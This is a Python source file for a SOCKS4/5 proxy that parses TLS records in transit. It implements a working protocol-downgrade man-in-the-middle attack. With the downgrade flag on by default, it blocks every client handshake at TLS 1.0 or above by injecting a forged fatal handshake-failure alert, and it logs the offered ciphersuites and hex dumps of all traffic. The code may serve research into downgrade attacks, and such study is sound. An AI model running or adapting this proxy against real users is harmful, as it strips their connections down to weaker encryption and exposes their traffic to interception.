import socketserver
import socket
import select
import os
import io
import sys
import tempfile

from tls import Message, build_fatal_alert, AlertDescription
from tls import ContentType, HandshakeType, CipherSuite, ProtocolVersion

MAX = 8192
ENABLE_DOWNGRADE = True

class socks_handler(socketserver.BaseRequestHandler):
    def mustrecv(self, n, why = 'data'):
        x = self.request.recv(n)
        if len(x) != n:
            raise IOError('short ' + why)
        return x

    def log(self, *args, **kwargs):
        print(file = self.logf, *args, **kwargs)
            
    def dump(self, why, bb):
        self.log(why, len(bb), '::', ''.join(['{0:02x}'.format(x) for x in bb]))
    
    def connect_backend(self, ip_be, port_be):
        self.backend_ip = '{0}.{1}.{2}.{3}'.format(*ip_be)
        self.backend_port = port_be[0] << 8 | port_be[1]

        self.log('connecting to', self.backend_ip, 'port', self.backend_port)
        self.backend = socket.create_connection((self.backend_ip, self.backend_port))
        self.log('connected')

    def handle_socks_setup(self):
        ver = self.mustrecv(1, 'socks version')[0]
                
        if ver == 0x04:
            self.handle_socks4_setup()
        elif ver == 0x05:
            self.handle_socks5_setup()
            
    def handle_socks4_setup(self):
        assert self.mustrecv(1)[0] == 0x01 # command
        port = self.mustrecv(2)
        ip = self.mustrecv(4)

        while True:
            b = self.mustrecv(1)[0]
            if b == 0x00:
                break
        
        self.connect_backend(ip, port)
        self.request.sendall(bytes([0, 0x5a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]))
    
    def handle_socks5_setup(self):
        NO_AUTH = 0
    
        # auth methods
        nmethods = self.mustrecv(1)
        methods = []
        for _ in range(nmethods[0]):
            meth = self.mustrecv(1)
            methods.append(meth[0])
        assert NO_AUTH in methods
        self.request.sendall(bytes([0x05, NO_AUTH]))
        
        # request
        assert self.mustrecv(1)[0] == 0x05 # socks5
        assert self.mustrecv(1)[0] == 0x01 # tcp client connection
        assert self.mustrecv(1)[0] == 0x00 # must be zero
        assert self.mustrecv(1)[0] == 0x01 # ipv4 addr
        ip = self.mustrecv(4)
        port = self.mustrecv(2)
        self.connect_backend(ip, port)
        
        # response
        self.request.sendall(bytes([0x05, 0x00, 0x00, 0x01] + list(ip) + list(port)))

    def tls_incoming(self, m):
        self.log('incoming from remote', m)
        
        if m.type == ContentType.ChangeCipherSpec:
            self.seen_changecipherspec = True

        if m.type == ContentType.Handshake and not m.opaque and m.body.type == HandshakeType.ServerHello:
            self.log('server selected', CipherSuite.tostring(m.body.body.ciphersuite))

        self.request.sendall(bytes(m))

    def tls_outgoing(self, m):
        self.log('outgoing from local', m)
        
        if m.type == ContentType.ChangeCipherSpec:
            self.seen_changecipherspec = True
            
        if m.type == ContentType.Handshake and m.version >= ProtocolVersion.TLSv1_0 and ENABLE_DOWNGRADE:
            self.log('sabotaging >= TLS1.0')
            self.log('original ciphersuites were:')
            for cs in m.body.body.ciphersuites:
                self.log(' ', CipherSuite.tostring(cs))
            self.request.sendall(bytes(build_fatal_alert(AlertDescription.HandshakeFailure)))
            return
        
        self.backend.sendall(bytes(m))

    def check_buf(self, buf, handler):
        while Message.prefix_has_full_frame(bytes(buf)):
            m = Message.decode(bytes(buf), opaque = self.seen_changecipherspec)
            lm = len(bytes(m))
            assert bytes(m) == bytes(buf[0:lm])
            del buf[0:lm]
            handler(m)

    def echo(self, buf, out):
        out.sendall(bytes(buf))
        buf[:] = []

    def check_bufs(self):
        if self.tls_enabled:
            self.check_buf(self.oubuf, self.tls_outgoing)
            self.check_buf(self.inbuf, self.tls_incoming)
        else:
            self.echo(self.oubuf, self.backend)
            self.echo(self.inbuf, self.request)

    def handle(self):
        logfd, logfile = tempfile.mkstemp(dir = 'tmp/', suffix = '.txt', prefix = 'proxy')
        self.logf = os.fdopen(logfd, 'w')
        self.handle_socks_setup()

        self.inbuf = []
        self.oubuf = []
        self.seen_changecipherspec = False

        self.tls_enabled = self.backend_port in (443, 4433)

        try:
            while True:
                r, w, x = select.select([self.backend, self.request],
                                        [],
                                        [self.backend, self.request],
                                        1)

                if x:
                    raise IOError('socket error: {0}'.format(x))

                if self.backend in r:
                    packet = bytes(self.backend.recv(MAX))
                    if len(packet) == 0:
                        break
                    self.dump('incoming', packet)
                    self.inbuf.extend(packet)
                    self.check_bufs()
                
                if self.request in r:
                    packet = bytes(self.request.recv(MAX))
                    if len(packet) == 0:
                        break
                    self.dump('outgoing', packet)
                    self.oubuf.extend(packet)
                    self.check_bufs()
                
        except KeyboardInterrupt:
            os._exit(1)
        finally:
            self.backend.close()
            self.request.close()
            self.logf.close()

class RebindTCP(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def __init__(self, *args, **kwargs):
        self.allow_reuse_address = True
        socketserver.TCPServer.__init__(self, *args, **kwargs)

if __name__ == '__main__':
    HOST, PORT = '0.0.0.0', 3355

    server = RebindTCP((HOST, PORT), socks_handler)
    print('listening on', HOST, PORT)
    server.serve_forever()
